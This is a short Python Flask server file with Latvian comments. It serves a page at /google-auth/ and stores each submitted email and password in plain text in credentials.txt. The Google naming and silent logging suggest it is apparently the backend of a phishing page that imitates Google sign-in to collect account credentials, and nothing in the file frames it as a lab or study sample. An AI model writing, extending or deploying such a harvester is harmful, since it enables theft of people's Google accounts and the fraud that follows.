from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

@app.route('/')
def home():
    return "Sveiks! Šis ir mans Flask serveris."

@app.route('/google-auth/', methods=['GET'])
def google_auth_page():
    return render_template('google-auth.html')

@app.route('/google-auth/', methods=['POST'])
def save_credentials():
    # Saņem datus no HTML formas vai JSON
    if request.is_json:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
    else:
        email = request.form.get('email')
        password = request.form.get('password')

    if not email or not password:
        return jsonify({'error': 'Missing email or password'}), 400

    with open('credentials.txt', 'a', encoding='utf-8') as f:
        f.write(f"Email: {email}, Password: {password}\n")

    # Atgriež atbildi atkarībā no veida
    if request.is_json:
        return jsonify({'message': 'Credentials saved'}), 200
    else:
        return render_template('google-auth.html', message="Dati saglabāti!")

if __name__ == '__main__':
    app.run(port=5000, debug=True)
